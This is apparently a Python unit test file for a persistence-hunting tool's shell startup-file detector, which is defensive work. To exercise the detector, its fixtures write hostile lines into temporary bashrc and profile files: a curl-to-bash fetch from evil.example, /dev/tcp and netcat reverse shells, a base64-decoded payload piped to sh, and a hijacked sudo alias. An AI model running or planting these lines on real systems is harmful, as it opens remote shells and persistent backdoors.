import os
import stat
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch

from persisthunt.detectors.shell import ShellDetector
from persisthunt.findings import FindingCollection, Finding, Severity

class TestShellDetector(unittest.TestCase):
    def setUp(self):
        self.temp_dir = TemporaryDirectory()
        self.root = Path(self.temp_dir.name)

        # Directory layout
        self.etc = self.root / "etc"
        self.etc.mkdir(parents=True)
        self.profile_d = self.etc / "profile.d"
        self.profile_d.mkdir(parents=True)

        self.root_home = self.root / "root"
        self.root_home.mkdir(parents=True)

        self.home = self.root / "home"
        self.user_dir = self.home / "alice"
        self.user_dir.mkdir(parents=True)

    def tearDown(self):
        self.temp_dir.cleanup()

    def _get_detector(self):
        return ShellDetector(
            root_prefix=self.root,
            system_files=[self.etc / "profile", self.etc / "bash.bashrc"],
            system_dirs=[self.profile_d],
            home_dir=self.home,
            root_home_dir=self.root_home,
        )

    def test_empty_system_returns_empty_collection(self):
        detector = self._get_detector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        self.assertEqual(findings.count(), 0)

    def test_missing_directories_do_not_crash(self):
        detector = ShellDetector(
            system_files=[self.root / "nonexistent_profile"],
            system_dirs=[self.root / "nonexistent_profile_d"],
            home_dir=self.root / "nonexistent_home",
            root_home_dir=self.root / "nonexistent_root",
        )
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        self.assertEqual(findings.count(), 0)

    def test_normal_startup_configuration_produces_zero_findings(self):
        # Benign system /etc/profile
        profile_content = (
            "# /etc/profile: system-wide .profile file for the Bourne shell\n"
            "export PATH=/usr/local/bin:/usr/bin:/bin\n"
            "umask 022\n"
            "if [ -d /etc/profile.d ]; then\n"
            "  for i in /etc/profile.d/*.sh; do\n"
            "    if [ -r $i ]; then\n"
            "      . $i\n"
            "    fi\n"
            "  done\n"
            "fi\n"
        )
        (self.etc / "profile").write_text(profile_content)

        # Benign profile.d script
        (self.profile_d / "locale.sh").write_text("export LANG=en_US.UTF-8\n")

        # Benign user .bashrc with standard environment setup
        user_bashrc = (
            "# ~/.bashrc: executed by bash(1) for non-login shells.\n"
            "alias ll='ls -alF'\n"
            "alias la='ls -A'\n"
            "alias l='ls -CF'\n"
            "export EDITOR=vim\n"
            "[ -f ~/.cargo/env ] && source ~/.cargo/env\n"
            "[ -s ~/.nvm/nvm.sh ] && source ~/.nvm/nvm.sh\n"
        )
        (self.user_dir / ".bashrc").write_text(user_bashrc)

        detector = self._get_detector()
        findings = detector.scan()
        self.assertEqual(findings.count(), 0)

    def test_suspicious_download_pipe_indicator(self):
        # curl piped to bash in .bashrc
        (self.user_dir / ".bashrc").write_text(
            "curl -sSL https://evil.example/setup.sh | bash\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        f_ids = {f.id for f in findings}
        self.assertIn("PH-SHELL-002", f_ids)
        dl_findings = [f for f in findings if f.id == "PH-SHELL-002"]
        self.assertEqual(dl_findings[0].severity, Severity.HIGH)
        self.assertIn("curl", dl_findings[0].evidence)
        self.assertIn("bash", dl_findings[0].evidence)

    def test_suspicious_standalone_wget_indicator(self):
        (self.user_dir / ".profile").write_text(
            "wget -q https://analytics.example/ping -O /dev/null &\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        dl_findings = [f for f in findings if f.id == "PH-SHELL-002"]
        self.assertEqual(len(dl_findings), 1)
        self.assertEqual(dl_findings[0].severity, Severity.MEDIUM)

    def test_suspicious_network_socket_reverse_shell(self):
        (self.root_home / ".bashrc").write_text(
            "/bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1 &\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        net_findings = [f for f in findings if f.id == "PH-SHELL-001"]
        self.assertEqual(len(net_findings), 1)
        self.assertEqual(net_findings[0].severity, Severity.HIGH)
        self.assertIn("/dev/tcp", net_findings[0].evidence)

    def test_suspicious_netcat_utility(self):
        (self.profile_d / "syscheck.sh").write_text(
            "nc -e /bin/sh 10.0.0.1 9001 &\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        nc_findings = [f for f in findings if f.id == "PH-SHELL-001"]
        self.assertEqual(len(nc_findings), 1)
        self.assertEqual(nc_findings[0].severity, Severity.HIGH)

    def test_temporary_directory_execution(self):
        (self.user_dir / ".zshrc").write_text(
            "/tmp/staged_agent.sh &\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        temp_findings = [f for f in findings if f.id == "PH-SHELL-003"]
        self.assertEqual(len(temp_findings), 1)
        self.assertEqual(temp_findings[0].severity, Severity.HIGH)
        self.assertIn("/tmp/staged_agent.sh", temp_findings[0].evidence)

    def test_hidden_directory_execution(self):
        (self.user_dir / ".bash_profile").write_text(
            "/home/alice/.hidden/backdoor &\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        hidden_findings = [f for f in findings if f.id == "PH-SHELL-004"]
        self.assertEqual(len(hidden_findings), 1)
        self.assertEqual(hidden_findings[0].severity, Severity.MEDIUM)
        self.assertIn(".hidden/backdoor", hidden_findings[0].evidence)

    def test_inline_interpreter_execution(self):
        (self.user_dir / ".bashrc").write_text(
            "python3 -c 'import socket; ...' &\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        inline_findings = [f for f in findings if f.id == "PH-SHELL-005"]
        self.assertEqual(len(inline_findings), 1)
        self.assertEqual(inline_findings[0].severity, Severity.MEDIUM)

    def test_base64_decode_payload(self):
        (self.etc / "profile").write_text(
            "echo 'c2xlZXAgMQ==' | base64 -d | sh &\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        b64_findings = [f for f in findings if f.id == "PH-SHELL-006"]
        self.assertEqual(len(b64_findings), 1)
        self.assertEqual(b64_findings[0].severity, Severity.HIGH)

    def test_hijacked_sudo_alias(self):
        (self.user_dir / ".bash_aliases").write_text(
            "alias sudo='/tmp/.sudo_capture'\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        alias_findings = [f for f in findings if f.id == "PH-SHELL-007"]
        self.assertEqual(len(alias_findings), 1)
        self.assertEqual(alias_findings[0].severity, Severity.HIGH)

    def test_insecure_world_writable_startup_file(self):
        startup_file = self.etc / "profile"
        startup_file.write_text("export TEST=1\n")
        startup_file.chmod(0o666)  # World-writable

        detector = self._get_detector()
        findings = detector.scan()

        perm_findings = [f for f in findings if f.id == "PH-SHELL-008"]
        self.assertEqual(len(perm_findings), 1)
        self.assertEqual(perm_findings[0].severity, Severity.HIGH)

    def test_binary_executable_in_profile_d(self):
        bin_file = self.profile_d / "evil_binary"
        bin_file.write_bytes(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00")

        detector = self._get_detector()
        findings = detector.scan()

        bin_findings = [f for f in findings if f.id == "PH-SHELL-004"]
        self.assertEqual(len(bin_findings), 1)
        self.assertIn("Binary executable", bin_findings[0].title)

    def test_broken_symlink_in_profile_d(self):
        broken = self.profile_d / "dangling.sh"
        broken.symlink_to("/nonexistent/file.sh")

        detector = self._get_detector()
        findings = detector.scan()

        link_findings = [f for f in findings if f.id == "PH-SHELL-091"]
        self.assertEqual(len(link_findings), 1)
        self.assertEqual(link_findings[0].severity, Severity.LOW)

    def test_permission_denied_handling(self):
        with patch("builtins.open", side_effect=PermissionError("Permission denied")):
            (self.user_dir / ".bashrc").write_text("export A=1\n")
            detector = self._get_detector()
            findings = detector.scan()

            perm_findings = [f for f in findings if f.id == "PH-SHELL-090"]
            self.assertGreaterEqual(len(perm_findings), 1)
            self.assertEqual(perm_findings[0].severity, Severity.INFO)

    def test_read_only_safety_preserves_files(self):
        startup = self.user_dir / ".bashrc"
        original = "export FOO=BAR\n"
        startup.write_text(original)
        mtime_before = startup.stat().st_mtime_ns

        detector = self._get_detector()
        findings = detector.scan()

        self.assertEqual(startup.read_text(), original)
        self.assertEqual(startup.stat().st_mtime_ns, mtime_before)

    def test_real_system_scan_does_not_crash(self):
        detector = ShellDetector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        for f in findings:
            self.assertIsInstance(f, Finding)
            self.assertEqual(f.category, "shell")
            self.assertTrue(f.id.startswith("PH-SHELL-"))
            self.assertIsInstance(f.severity, Severity)

if __name__ == "__main__":
    unittest.main()
